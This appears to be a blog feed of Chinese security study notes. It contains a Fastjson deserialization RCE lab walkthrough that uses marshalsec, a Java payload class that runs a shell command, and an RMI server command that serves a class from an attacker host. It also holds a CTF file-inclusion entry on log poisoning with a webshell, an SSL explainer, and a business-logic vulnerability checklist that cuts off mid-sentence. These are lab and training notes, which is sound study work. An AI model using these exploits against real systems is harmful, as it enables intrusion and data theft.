60fbeb94344529c60e55524fe28ebe5974243826c2ef4d6038ea403532119c3838f26b2b2c37df00e64f2f0415860b99cf753c1faa7f91c9f8597226ef02c92b10f35da8f524e194347806b716b54874ea02006ea39da0abb50fe06720c4501d66aecee407433550de1aee35fbcdeb9942867cbf57428b165039085c8a110a43d2c98910d7036d3e65018ab6fc5382d95fd9065a9529cc9344bc220e711c39b53acf86cf21774893f0aa9b76a85b3c17aa0073a6968252b7a24eeca035f4411d58edac580baac7949573ed935cc99a3473307839d911f099b77f19fad07a882a0ac6b68b34afdd2e32cb1a4438afb2dbd43f0207042bb286ef90633e80f3219164f4cd5ba32840f6b5b6bdf3482cb9010dfcc18427bd210f55ae1371a43bef03ac776425ecda764fc229ef664102a3e1ac87a01af7638d2c3555a6c0b59ca1fc7f739567c1d405cfe034b6edc38a10a0b02461db1a0c5fae24c6b6d0d3c12ff649f75e721f95ed0ba7625d26ae787629da5e114acdf005bf55f75f9ce59a3003d74377496091a76837338e4e759bdb375b36191b7c275295c3754fae1d2f8078f795bb05ef132f2880d5314059d8f2c57cb93670ba5e4ff6365073a07bb57429ed00e3c078f4e419f22c3eae48387612d18f3de904ec43d8aa26dab03e81046293a93df815468b344e3b4731ecd041aa192bafc7015878d8f78f97aa80df8f8e1d684a14be5ca327d552d986a8e8a99b602beae06ee01c9f2043dbe2de9242a914a8a1c7f61c5721d5b02987b007c1e7fde0904058a2cbf2a5b95207065639506bfc8d550854c9974ce42210a04dfe011badcc4558b4c54c7c8165f908cc298a952bc3a46ff9355970749b7f65f2e0eda3d3d6474e55a3db75c6c6df9efff9ca5b5203b961abc4125bd0ef21a2c16c72b60f5dd8387337cf0c5b27b4b2793eabb5a6b2a8f90b49dd6fd73379c319b1cfd4d86c0259ead3091eefbb402a351652ba6c8d70b1f3aa4807b48ce9b6151cf3f426387d5115e02a55c17cf5d3a075301f50415d6e3b6161c9a34e6d3df5ffb69ec5d11b29dfd2936f98b18b120596009a758c2a7ec7ff0ddecb7dd497c2d87877e44f92ef546e9ac5fb592cd3f5b5c13d2f3851c8d32f8f0855638cb3188531b17a84b9a20ef377e7fb3ab5bc2ef1773a93d1105d1a211531c852459115065d3d76fd735eb0d4e829a9f5631b3709e7c053b296cd431b15f93cae88400952fb61b7514410edad7f33dbb4c3391ea0b38d92ba5870cf1c10c326fcde21649c51414cb388c855fdf17e11d6846c28eef3413d0593d41bc7e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> NetSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/13/2024-08-01-java-unserialize/"/>
      <url>/2024/11/13/2024-08-01-java-unserialize/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><h2 id="玩玩这个漏洞"><a href="#玩玩这个漏洞" class="headerlink" title="玩玩这个漏洞"></a>玩玩这个漏洞</h2><p><a href="/../assets/img/image-52.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-52.png" alt="alt text"></a></p><h2 id="借助项目"><a href="#借助项目" class="headerlink" title="借助项目"></a>借助项目</h2><p> <a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a></p><p><a href="/../assets/img/image-53.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-53.png" alt="alt text"></a></p><h3 id="获取Jar"><a href="#获取Jar" class="headerlink" title="获取Jar"></a>获取Jar</h3><p><a href="/../assets/img/image-54.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-54.png" alt="alt text"></a></p><h3 id="编译成功"><a href="#编译成功" class="headerlink" title="编译成功"></a>编译成功</h3><p><a href="/../assets/img/image-55.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-55.png" alt="alt text"></a></p><h3 id="Demo-class"><a href="#Demo-class" class="headerlink" title="Demo.class"></a>Demo.class</h3><p><a href="/../assets/img/image-57.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-57.png" alt="alt text"></a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行rmi程序"><a href="#运行rmi程序" class="headerlink" title="运行rmi程序"></a>运行rmi程序</h3><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.31.241:1234/#Demo&quot; 9999</code></p><p><a href="/../assets/img/image-56.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-56.png" alt="alt text"></a></p><p><a href="/../assets/img/image-59.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-59.png" alt="alt text"></a></p><p><a href="/../assets/img/image-58.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-58.png" alt="alt text"></a></p><h3 id="一定要注意版本问题"><a href="#一定要注意版本问题" class="headerlink" title="一定要注意版本问题"></a>一定要注意版本问题</h3><p>java 版本和 javac 版本一定要一致，不然会出现问题</p><p><a href="/../assets/img/image-60.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-60.png" alt="alt text"></a></p><p>应该使用第二个javac</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>什么是SSL证书</title>
      <link href="/2024/11/13/2024-07-31-whatissslcert/"/>
      <url>/2024/11/13/2024-07-31-whatissslcert/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="SSL证书的工作原理"><a href="#SSL证书的工作原理" class="headerlink" title="SSL证书的工作原理"></a>SSL证书的工作原理</h2><p>SSL（安全套接字层）以及此协议的升级版本，称为TLS（传输层安全性），是一种构建<a href="https://us.norton.com/blog/privacy/what-is-encryption">加密</a>Web 浏览器和服务器之间的连接。</p><p>您可以将用户和网站视为峡谷两侧的两座建筑物。为了让用户访问网站，反之亦然，需要有一个桥梁。SSL证书就是那座桥梁——它是安全的，并允许信息安全地从一侧传输到另一侧。</p><p>在访问具有SSL证书的网站的几毫秒内，会发生许多重要的过程：</p><ul><li>您的浏览器会向网站的服务器发送请求，要求提供安全页面。</li><li>服务器将SSL证书与公钥一起传输。公钥对数据进行加密并验证数字签名。</li><li>您的浏览器会验证数字签名的合法性，并在地址栏中显示挂锁图标。</li><li>然后，您的浏览器会使用密钥将加密数据传输到站点的服务器。</li><li>使用私有解密密钥，服务器读取数据并访问密钥。</li><li>只要连接就位，浏览器和服务器就会使用秘密解密密钥来回共享安全数据。</li></ul><p>如果您在线并访问没有 SSL 加密的网站，您可能会被警告”<a href="https://us.norton.com/blog/how-to/your-connection-is-not-private">您的连接不是私有的</a>.”这意味着网络犯罪分子可以拦截您在该网站上分享的任何内容。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-01.png" title="Illustrated chart covering how SSL certificates work." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-01.png" alt="Illustrated chart covering how SSL certificates work."></a></p><h2 id="SSL-的类型"><a href="#SSL-的类型" class="headerlink" title="SSL 的类型"></a>SSL 的类型</h2><p>SSL 有三种主要类型：扩展验证、组织验证和域验证。其中有一些变体作为亚型存在，它们包括通配符、MD&#x2F;SAN 和 UCC。</p><p>主要区别在于需要哪些信息来保护每种类型。扩展验证证书需要的信息最多，而域验证证书需要的信息最少。</p><p>这通常意味着信息量更大的证书更值得信赖，因为获得证书所需的信息深度。</p><p>在这三种主要类型中，有更专业的版本，通常是为企业或其他大型组织设计的。</p><p>每个 SSL 证书都包含以下信息：</p><ul><li>域名</li><li>拥有证书的公司、个人或设备</li><li>子域名</li><li>证书颁发机构 （CA）</li><li>CA 的数字签名</li><li>发行日期</li><li>有效期</li><li>公钥（私钥是保密的）</li></ul><h3 id="扩展验证证书-（EV-SSL）"><a href="#扩展验证证书-（EV-SSL）" class="headerlink" title="扩展验证证书 （EV SSL）"></a>扩展验证证书 （EV SSL）</h3><p><strong>EV SSL是所有SSL证书中经过最广泛审查和检查的证书。</strong>对于要获得 EV SSL 的网站，它必须完成一个 16 步过程，验证有关网站所有权的详细信息。其中一些详细信息包括确认：</p><ul><li>域</li><li>网站所有者</li><li>申请人的实际住址</li><li>开展业务的合法权利</li></ul><p>这些SSL通常由大型公司和任何需要向公众展示最高可信度的机构使用，包括银行和支付处理器。当您访问其中一个网站时，EV SSL 表明域名所有者已采取重大措施<a href="https://us.norton.com/blog/how-to/ten-ways-to-keep-your-data-private">保护数据隐私的步骤</a>.</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-02.png" title="Illustrated chart covering what an Extended Validation Certificate (EV SSL) is." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-02.png" alt="Illustrated chart covering what an Extended Validation Certificate (EV SSL) is."></a></p><h3 id="组织验证证书-（OV-SSL）"><a href="#组织验证证书-（OV-SSL）" class="headerlink" title="组织验证证书 （OV SSL）"></a>组织验证证书 （OV SSL）</h3><p>获得 OV SSL 比申请 EV SSL 更容易。<strong>对于颁发 OV SSL 的证书颁发机构，他们仅对实体执行基本审查。</strong>他们检查组织或企业是否存在，以及申请证书的实体是否拥有域名。</p><p>OV SSL 的最常见用途是用于需要安全性但不面向公众的站点。例如，OV SSL 非常适合需要为内部系统提供安全登录页面或作为 Intranet 安全性的公司。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-03.png" title="Illustrated chart covering what an Organization Validated Certificate (OV SSL) is." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-03.png" alt="Illustrated chart covering what an Organization Validated Certificate (OV SSL) is."></a></p><h3 id="域验证证书-（DV-SSL）"><a href="#域验证证书-（DV-SSL）" class="headerlink" title="域验证证书 （DV SSL）"></a>域验证证书 （DV SSL）</h3><p>DV SSL是最基本的SSL证书类型。<strong>证书颁发机构仅确认域由请求证书的个人或实体控制。</strong> DV SSL 可以快速发布，但它提供与 EV 和 OV SSL 相同的加密级别。<a href="https://us.norton.com/blog/malware/what-is-cybersecurity-what-you-need-to-know">网络安全</a>立场。因为它们相对容易获得并且可以提供安全的错觉，所以有时会在不安全的网站上找到 DV SSL。</p><p>这些 SSL 适用于小型企业网站、个人网站和博客，因为它们可以加密流量并允许人们在无需提供身份验证的情况下安全访问。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-04.png" title="Illustrated chart covering what a Domain Validation Certificate (DV SSL) is." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-04.png" alt="Illustrated chart covering what a Domain Validation Certificate (DV SSL) is."></a></p><h3 id="通配符SSL证书"><a href="#通配符SSL证书" class="headerlink" title="通配符SSL证书"></a>通配符SSL证书</h3><p><strong>通配符 SSL 涵盖网站上的子域，而无需为每个子域提供单独的 SSL 证书。</strong> 证书使用一个字符（通常是星号）作为多个其他字符（通常是其他页面或子域的名称）的替换。通配符在 DV 和 OV SSL 中都可用。</p><p>通配符证书对于在同一服务器上具有多个子域的实体非常有用。它们比为每个子域购买证书更实惠，并且它们允许您随着时间的推移添加和删除子域。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-05.png" title="Illustrated chart covering what a wildcard SSL is." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-05.png" alt="Illustrated chart covering what a wildcard SSL is."></a></p><h3 id="多域和主题备用名称-SSL-证书-（MD-SAN）"><a href="#多域和主题备用名称-SSL-证书-（MD-SAN）" class="headerlink" title="多域和主题备用名称 SSL 证书 （MD&#x2F;SAN）"></a>多域和主题备用名称 SSL 证书 （MD&#x2F;SAN）</h3><p><strong>MD 或 SAN SSL 证书使用单个证书认证多个域和子域。</strong> 这些证书中的大多数可以同时用于多达 250 个不同的域。这些证书以 EV、OV 和 DV SSL 的形式提供。</p><p>对于拥有许多不同域的公司或组织，MD 或 SAN SSL 是保护所有这些域的最快、最简单的方法。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-06.png" title="Illustrated chart covering what a Multi-Domain Validation Certificate (MDC SSL) is." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-06.png" alt="Illustrated chart covering what a Multi-Domain Validation Certificate (MDC SSL) is."></a></p><h4 id="统一通信证书-（UCC）"><a href="#统一通信证书-（UCC）" class="headerlink" title="统一通信证书 （UCC）"></a><strong>统一通信证书 （UCC）</strong></h4><p><strong>UCC 是一种 SAN 证书，它允许在一个证书下保护三个或更多服务器上的多个域和子域。</strong> UCC 还具有专门用于保护 Microsoft Exchange、Live 和通信服务器类型的附加功能。它们以 EV、OV 或 DV SSL 的形式提供。</p><p>对于在多个服务器上具有多个域和子域的大型组织，以及具有 Microsoft Exchange 服务器的组织，UCC 可以更轻松地管理 SSL 证书。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-07.png" title="Illustrated chart covering what a Unified Communication Certificate (UCC) is." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-07.png" alt="Illustrated chart covering what a Unified Communication Certificate (UCC) is."></a></p><h2 id="为什么网站需要SSL证书"><a href="#为什么网站需要SSL证书" class="headerlink" title="为什么网站需要SSL证书"></a>为什么网站需要SSL证书</h2><p>网络攻击是一种令人惊讶的常见威胁。<a href="https://us.norton.com/blog/emerging-threats/cybersecurity-statistics"><strong>网络安全统计</strong></a> **表明超过一半的互联网用户在过去一年中直接经历过网络犯罪。这意味着人们比以往任何时候都更需要保护自己的数据，并且<a href="https://us.norton.com/blog/how-to/how-to-know-if-a-website-is-safe">了解他们访问的网站是否安全</a>.</p><p>SSL证书是更安全浏览墙中的一块重要砖块，因为它让您知道您在网站上共享的信息受到加密保护。如果没有加密，从用户传输到站点的数据就不会受到保护，从而使您面临<a href="https://us.norton.com/blog/wifi/what-is-a-man-in-the-middle-attack">中间人攻击</a>以及其他类型的网络攻击。</p><p>如果您是企业主或负责组织的网站，SSL 可以为您的客户和其他网站用户提供额外的保护层，让您高枕无忧。虽然这些SSL安全证书之一不足以阻止或阻止所有形式的<a href="https://us.norton.com/blog/emerging-threats/what-is-a-hacker">黑客</a>或者信息盗窃本身，这是一个重要的步骤，可以帮助保护组织的数据和公众认知。</p><p><a href="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-08.png" title="Illustrated chart explaining a few of the main reasons why websites should have SSL certificates." class="gallery-item"><img src="https://us.norton.com/content/dam/blogs/images/norton/am/what-is-an-ssl-certificate-08.png" alt="Illustrated chart explaining a few of the main reasons why websites should have SSL certificates."></a></p><h2 id="如何获取SSL证书"><a href="#如何获取SSL证书" class="headerlink" title="如何获取SSL证书"></a>如何获取SSL证书</h2><p>如果您拥有一个网站，您可能想知道如何利用SSL证书附带的额外信任。继续阅读以了解如何为您的网站获取一个。</p><h3 id="1-确认您需要的信息"><a href="#1-确认您需要的信息" class="headerlink" title="1. 确认您需要的信息"></a>1. 确认您需要的信息</h3><p>每个证书颁发机构都有不同的要求，您需要先满足这些要求，然后才能发出 SSL。考虑到这一点，无论您是申请 EV、OV 还是 DV SSL，<strong>每个 CA 都会要求您提供一些标准信息</strong>，包括：</p><ul><li>证明您拥有该域名</li><li>证明您是申请SSL的人</li></ul><p>随着验证级别的提高，您需要提供更多信息。</p><h3 id="2-选择从何处获取-SSL-证书"><a href="#2-选择从何处获取-SSL-证书" class="headerlink" title="2. 选择从何处获取 SSL 证书"></a>2. 选择从何处获取 SSL 证书</h3><p><strong>全球有数十个不同的证书颁发机构验证和提供网站 SSL。</strong> 在搜索 CA 时，请考虑查找符合以下条件的 CA：</p><ul><li>提供您需要的 SSL 类型</li><li>满足颁发证书所需的所有最低标准</li><li>具有清晰的定价结构</li><li>为您提供所需的客户支持</li></ul><h3 id="3-考虑SSL的成本"><a href="#3-考虑SSL的成本" class="headerlink" title="3.考虑SSL的成本"></a>3.考虑SSL的成本</h3><p>虽然大多数SSL证书要求您向证书颁发机构付费，但也有免费选项。通常，免费的SSL仅限于域验证证书，这意味着对于具有多个域和子域的大型实体或组织来说，它们并不理想（甚至可能可用）。</p><ul><li><strong>如果您有个人网站或小型企业的简单网站</strong>，那么免费的SSL证书可能会为您提供所需的一切。</li><li><strong>适用于处理敏感问题的大型企业或组织</strong><a href="https://us.norton.com/blog/privacy/what-personal-information-should-you-safeguard"><strong>个人信息</strong></a> <strong>与财务或医疗数据一样</strong>，与可以跨一个或多个服务器颁发涵盖多个域或子域的证书的 CA 通常是一个好主意。</li></ul><h3 id="4-掌握SSL证书续订情况"><a href="#4-掌握SSL证书续订情况" class="headerlink" title="4.掌握SSL证书续订情况"></a>4.掌握SSL证书续订情况</h3><p>对于小企业主或博主来说，如果您的SSL证书过期并且您忘记续订几天，这可能不是一个大问题。</p><p>但是，如果您是一个每天处理大量外部或内部流量的大品牌，那么失效的证书可能会花费您很多钱并损害您的声誉。</p><h3 id="什么是证书颁发机构？"><a href="#什么是证书颁发机构？" class="headerlink" title="什么是证书颁发机构？"></a>什么是证书颁发机构？</h3><p>证书颁发机构 （CA） 是颁发 SSL 证书的组织。CA 的工作是使用证书验证站点所有者的身份，然后存储和签署这些证书。他们必须满足严格的准则，以便设备、操作系统和浏览器信任他们的证书。</p><h3 id="什么是公钥-私钥对？"><a href="#什么是公钥-私钥对？" class="headerlink" title="什么是公钥&#x2F;私钥对？"></a>什么是公钥&#x2F;私钥对？</h3><p>公钥和私钥使授权用户能够发送和接收加密数据。</p><p>公钥由证书生成，任何使用站点的人都可以使用。私钥是秘密的，在建立连接后由用户的浏览器创建。由于加密数据是在证书所有者和用户之间发送的，因此除了公钥的颁发者和私钥的持有者之外，任何人都无法读取数据。</p><h3 id="SSL证书的有效期是多久？"><a href="#SSL证书的有效期是多久？" class="headerlink" title="SSL证书的有效期是多久？"></a>SSL证书的有效期是多久？</h3><p>大多数SSL证书的有效期为一年，但有些CA提供更长的覆盖期限，例如两到三年。</p><h3 id="什么是安全证书？"><a href="#什么是安全证书？" class="headerlink" title="什么是安全证书？"></a>什么是安全证书？</h3><p>安全证书（包括 SSL 或 TLS 证书）是一个小型数据文件，用于向用户证明站点的真实性以及<a href="https://us.norton.com/blog/privacy/ssl-vpn">创建安全连接</a>使用加密。</p><h3 id="SSL证书可以在多台服务器上使用吗？"><a href="#SSL证书可以在多台服务器上使用吗？" class="headerlink" title="SSL证书可以在多台服务器上使用吗？"></a>SSL证书可以在多台服务器上使用吗？</h3><p>是的，使用多域证书，您可以在多个服务器上使用一个 SSL。</p><h3 id="HTTPS-是如何工作的？"><a href="#HTTPS-是如何工作的？" class="headerlink" title="HTTPS 是如何工作的？"></a>HTTPS 是如何工作的？</h3><p><a href="/../assets/img/Pasted%20image%2020240131171202.png" title="alt text" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020240131171202.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> NetSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebSec </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2024/11/13/2024-07-29-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/11/13/2024-07-29-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>CTF文件包含</p><p>&#x3D;&#x3D;&#x3D;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//WEB手要懂得搜索</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="获取nginx-log文件"><a href="#获取nginx-log文件" class="headerlink" title="获取nginx log文件"></a>获取nginx log文件</h2><p><a href="/../assets/img/image.png" title="alt text" class="gallery-item"><img src="/../assets/img/image.png" alt="alt text"></a></p><h2 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h2><p>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>业务逻辑漏洞的挖掘</title>
      <link href="/2024/11/13/2024-07-29-bussiness_logic_bug/"/>
      <url>/2024/11/13/2024-07-29-bussiness_logic_bug/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>1 、身份认证安全<br>1.1、暴力破解<br>在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。简单的验证码爆破。</p><p>1.2、session &amp; cookie类<br>会话固定攻击:利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。</p><p>Cookie仿冒:修改cookie中的某个参数可以登录其他用户。</p><p>1.3、弱加密<br>未使用https，是功能测试点，不好利用。</p><p>前端加密，用密文去后台校验，并利用smart decode可解</p><p>2、业务一致性安全<br>2.1、手机号篡改<br>抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。</p><p>2.2、邮箱或者用户篡改<br>抓包修改用户或者邮箱参数为其他用户或者邮箱</p><p>2.3、订单id篡改<br>查看自己的订单id，然后修改id(加减一)查看是否能查看其他订单信息。</p><p>2.4、商品编号篡改<br>例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005,在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品</p><p>2.5、用户id篡改<br>抓包查看自己的用户id，然后修改id(加减1)查看是否能查看其他用户id信息。</p><p>3、业务数据篡改<br>3.1、金额数据篡改<br>抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数据的金额并提交，查看能否以修改后的金额数据完成业务流程。</p><p>3.2、商品数量篡改<br>抓包修改商品数量等子段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。</p><p>3.3、最大数限制突破<br>很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。</p><p>3.4、本地js参数修改<br>部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。</p><p>4、密码找回漏洞<br>密码找回逻辑测试一般流程</p><p>i.首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包</p><p>ii.分析数据包，找到敏感部分</p><p>iii.分析后台找回机制所采用的验证手段</p><p>iv.修改数据包验证推测</p><p>5、验证码突破<br>验证码不单单在登录、找密码应用，提交敏感数据的地方也有类似应用，故单独分类，并进一步详情说明。</p><p>5.1、验证码暴力破解测试<br>使用burp对特定的验证码进行暴力破解</p><p>5.2、验证码时间、次数测试<br>抓取携带验证码的数据包不断重复提交，例如:在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。</p><p>5.3、验证码客户端回显测试<br>当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebuf就可看到客户端与服务器进行交互的详细信息</p><p>5.4、验证码绕过测试<br>当第一步向第二步跳转时，抓取数包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。</p><p>5.5、验证码js绕过<br>短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二步，第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。</p><p>6、业务授权安全<br>6.1、未授权访问<br>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p><p>6.2、越权访问<br>水平越权</p><p>即用户A和用户B属于同一个权限组，水平越权就是用户A可以看到用户B才可以看到的一些内容。一个简单的例子，就是保单管理系统中，每个人都只可以看到自己的保单，如果出现用户A可以查看到用户B的保单的现象，此时就发生了水平越权。</p><p>垂直越权</p><p>即用户A和用户B属于不同的权限组，如用户A属于普通用户权限组，而用户B属于管理员权限组，垂直越权就是用户A可以看到用户B才可以看到的内容。一个简单的例子，用户A可以看到通讯录界面，用户B可以看到通讯录和用户管理的界面（其中用户管理界面可以看到用户密码）。如果用户A修改一下请求的URL即可以看到作为管理员才可已看到的全部用户密码，此时就发生了垂直越权。</p><p>检测思路</p><p>出现越权访问漏洞的主要原因，是因为开发人员只是在前端界面进行了简单的菜单隐藏，而没有用统一的服务端拦截器&#x2F;中间件对于全部URL请求进行权限判断。这样，攻击者只需要在浏览器或者BurpSuite之类的攻击工具中，发出对于指定URL的请求，即可以实现对于特定接口的越权访问。</p><p>如果将用户A与他所属的权限组&#x2F;不同权限组用户群体的惯常访问URL合集进行比对，可